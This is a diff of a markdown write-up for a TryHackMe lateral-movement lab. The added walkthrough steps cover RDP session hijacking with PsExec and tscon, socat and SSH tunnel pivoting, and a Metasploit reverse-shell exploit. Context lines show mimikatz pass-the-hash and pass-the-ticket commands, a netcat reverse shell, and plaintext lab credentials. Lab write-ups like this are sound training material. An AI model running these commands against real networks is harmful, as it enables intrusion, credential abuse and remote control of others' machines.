@@ -96,7 +96,7 @@ We can create a service on a remote host with sc.exe, a standard tool available 
 
 2. If the latter connection fails, sc will try to reach SVCCTL through SMB named pipes, either on port 445 (SMB) or 139 (SMB over NetBIOS).
 
-<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (3).png" alt=""><figcaption></figcaption></figure>
 
 We can create and start a service named "THMservice" using the following commands:
 
@@ -574,13 +574,13 @@ Let's have a quick look at how Kerberos authentication works on Windows networks
 
     Notice the TGT is encrypted using the **krbtgt** account's password hash, so the user can't access its contents. It is important to know that the encrypted TGT includes a copy of the Session Key as part of its contents, and the KDC has no need to store the Session Key as it can recover a copy by decrypting the TGT if needed.
 
-<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (5).png" alt=""><figcaption></figcaption></figure>
 
 2. When users want to connect to a service on the network like a share, website or database, they will use their TGT to ask the KDC for a **Ticket Granting Service (TGS)**. TGS are tickets that allow connection only to the specific service for which they were created. To request a TGS, the user will send his username and a timestamp encrypted using the Session Key, along with the TGT and a **Service Principal Name (SPN),** which indicates the service and server name we intend to access.
 
 As a result, the KDC will send us a TGS and a **Service Session Key**, which we will need to authenticate to the service we want to access. The TGS is encrypted using the **Service Owner Hash**. The Service Owner is the user or machine account under which the service runs. The TGS contains a copy of the Service Session Key on its encrypted contents so that the Service Owner can access it by decrypting the TGS.
 
-<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
 
 3. The TGS can then be sent to the desired service to authenticate and establish a connection. The service will use its configured account's password hash to decrypt the TGS and validate the Service Session Key.
 
@@ -761,7 +761,7 @@ kerberos::ptt [0;363979]-2-0-40e10000-t1_toby.beck@krbtgt-ZA.TRYHACKME.COM.kirbi
 klist
 ```
 
-<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Victim**
 
@@ -796,7 +796,7 @@ nc -lvp 5556
 sekurlsa::pth /user:t1_toby.beck  /domain:za.tryhackme.com /aes256:6a0d48f79acaec013d928d84a102b72028d574340b6139e876e179db48fbde4e    /run:"c:\tools\nc64.exe -e cmd.exe $KALI 5556"
 ```
 
-![](<../../.gitbook/assets/image (11).png>)
+![](<../../.gitbook/assets/image (11) (1).png>)
 
 
 
@@ -899,6 +899,12 @@ To complete this exercise, you will need to connect to THMJMP2 using a new set o
 xfreerdp /v:thmjmp2.za.tryhackme.com /u:YOUR_USER /p:YOUR_PASSWORD
 ```
 
+**Kali**
+
+```
+xfreerdp /v:thmjmp2.za.tryhackme.com /u:t2_kelly.blake /p:8LXuPeNHZFFG
+```
+
 These credentials will grant you administrative access to THMJMP2.
 
 For this task, we'll work on hijacking an RDP session. If you are interested in trying backdooring exe or other files, you can find some exercises about this in the [Windows Local Persistence](https://tryhackme.com/jr/windowslocalpersistence) room.
@@ -906,6 +912,31 @@ For this task, we'll work on hijacking an RDP session. If you are interested in 
 Follow the instructions to hijack t1\_toby.beck's RDP session on THMJMP2 to get your flag.
 
 Note: When executing `query session`, you'll see several users named t1\_toby.beck followed by a number. These are just identical copies of the same user, and you can hijack any of them (you don't need to hijack them all). Make sure you hijack a session marked as disconnected (Disc.) to avoid interfering with other users.
+
+
+
+**Victim(cmd)**
+
+```
+C:\tools\PsExec64.exe -s cmd.exe
+query user
+```
+
+<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+
+**Victim(cmd)**
+
+```
+tscon 4 /dest:rdp-tcp#1
+```
+
+Logged me in a Toby right away
+
+<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+
+
+
+
 
 ## Port Forwarding
 
@@ -922,7 +953,7 @@ The first protocol we'll be looking at is SSH, as it already has built-in functi
 
 SSH Tunnelling can be used in different ways to forward ports through an SSH connection, which we'll use depending on the situation. To explain each case, let's assume a scenario where we've gained control over the PC-1 machine (it doesn't need to be administrator access) and would like to use it as a pivot to access a port on another machine to which we can't directly connect. We will start a tunnel from the PC-1 machine, acting as an SSH client, to the Attacker's PC, which will act as an SSH server. The reason to do so is that you'll often find an SSH client on Windows machines, but no SSH server will be available most of the time.
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Since we'll be making a connection back to our attacker's machine, we'll want to create a user in it without access to any console for tunnelling and set a password to use for creating the tunnels:
 
@@ -995,7 +1026,7 @@ The `fork` option allows socat to fork a new process for each connection receive
 
 Coming back to our example, if we wanted to access port 3389 on the server using PC-1 as a pivot as we did with SSH remote port forwarding, we could use the following command:
 
-<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 Note that socat can't forward the connection directly to the attacker's machine as SSH did but will open a port on PC-1 that the attacker's machine can then connect to:
 
@@ -1108,3 +1139,58 @@ After launching the exploit, you will receive a shell back at the attacker's mac
 
 
 
+**Kali**
+
+```
+ssh za\\arthur.campbell@thmjmp2.za.tryhackme.com
+Password: Pksp9395
+```
+
+**Victim(cmd)**
+
+```
+C:\tools\socat\socat TCP4-LISTEN:13389,fork TCP4:THMIIS.za.tryhackme.com:3389
+```
+
+**Kali**
+
+```
+xfreerdp +clipboard /v:THMJMP2.za.tryhackme.com:13389 /u:t1_thomas.moore /p:MyPazzw3rd2020
+```
+
+<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+
+**Kali**
+
+```
+useradd tunneluser
+passwd tunneluser
+```
+
+**Victim**
+
+```
+ssh tunneluser@$KALI -R 8888:thmdc.za.tryhackme.com:80 -L *:1990:127.0.0.1:1990 -L *:1029:127.0.0.1:1029 -N
+```
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+**Kali(Metasploit**
+
+```
+msfconsole
+use rejetto_hfs_exec
+set payload windows/shell_reverse_tcp
+
+set lhost thmjmp2.za.tryhackme.com
+set ReverseListenerBindAddress 127.0.0.1
+set lport 1029
+set srvhost 127.0.0.1
+set srvport 1990
+
+set rhosts 127.0.0.1
+set rport 8888
+exploit
+```
+
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
